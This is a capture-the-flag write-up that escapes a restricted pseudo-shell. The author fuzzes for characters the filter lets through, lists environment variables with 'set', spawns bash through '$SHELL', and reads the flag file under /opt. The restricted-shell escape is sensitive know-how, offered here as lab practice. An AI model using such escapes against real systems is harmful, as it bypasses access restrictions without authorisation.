# Shelle  
### Challenge  
**Tag:** _Medium_

**Description:**  
Professor Shelle created a custom psuedo shell for us to learn Linux, she
believes it's safe and no one can ever read the flag. Can you prove her wrong?

### Solve  
On the first login everyone does the directory list so I did the same thing:  
```shell  
root@shelle$ls  
ls  
assignment.txt  bin  
```

i cat the `assigment.txt` and it was the rules for the students... but we are
not here to learn something we are here to get the flag!

I played a bit with those commands then I asked myself what if I don't run
them and run something else... so I ran:  
```  
root@shelle$nano  
nano  
/bin/bash: nano: command not found

```  
I'm a vim user but nano is basically everywhere!

but it wasn't there! so I ran another one...  
one of the papular commands is grep. I ran `grep *` to basically cat the
`assignment.txt` but it gave me an error!  
```  
root@shelle$grep *  
grep *

Illegal Character found, for safety reasons only certain characters are
allowed  
```

illegal character? hmmmmmmmm?

In the last write-up in [Misc: Badwords], I write about what I usually do in
this kind of challenge...  
basically, I try to get a new shell by running the command for example bash or
sh...

I went to do the same thing but it said:  
```  
/bin/bash: bash: command not found  
```  
wierddddddddd!  
I used an escape character (BackSlash) to bypass it but it gave me an illegal
character error.

so our goal is to find special characters!  
for this I'm using:

```  
seclists  
	\_Fuzzing  
		\_special-chars.txt  
```

knowing the illegal characters will help me to work better with the shell.

then when I was manually doing the fuzzing I found out that `-` is not
blocked...  
the `-` was returning the `/bin/bash` help menu because if you do something
like this:

```  
/bin/bash -c -  
```

you will get an error and help menu...

how do I know that `-c` flag is used?

well! it's fuzzing again...

if you do `"`without closing it you will get this message:

```  
root@shelle$"  
"  
/bin/bash: -c: line 0: unexpected EOF while looking for matching `"'  
/bin/bash: -c: line 1: syntax error: unexpected end of file  
```

I was doing the fuzzing that I found out `$` character is not blocked so I
knew that I can do something with that!

there is one big thing that works with `$` in shells and that's variables!  
there are a lot of ways to do it but I tried these:  
```  
printenv  
env  
set  
```  
and set command worked and listed all of the environment variables.

in the environment variables, I saw two-variable `BASH` & `SHELL`...  
which both of them will point to the bash location this is what I do in the
restricted shells at first.

I used `$SHELL` and boom it worked I got the shell!  
```  
root@shelle$$SHELL  
$SHELL  
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell  
bash: groups: command not found  
shelle@shelle-09175d04c26df208-77c8546756-f8lqx:~$  
```

and I straight went for the flag!

how do I know where that flag is?

well after seeing that `assignment.txt`, I played a bit with those commands
and when I was using the `ps` command I saw something sus.

there is a binary on `/opt/binary` which was the only thing that was weird in
those processes!  
I didn't know that flag is there I just felt it and went for it and boom:

```  
shelle@shelle-09175d04c26df208-77c8546756-f8lqx:~$ cd /opt/  
cd /opt/  
shelle@shelle-09175d04c26df208-77c8546756-f8lqx:/opt$ ls  
ls  
binary  flag.txt  
shelle@shelle-09175d04c26df208-77c8546756-f8lqx:/opt$ cat flag.txt  
cat flag.txt  
flag{82ad133488ad326eaf2120e03253e5d7}  
```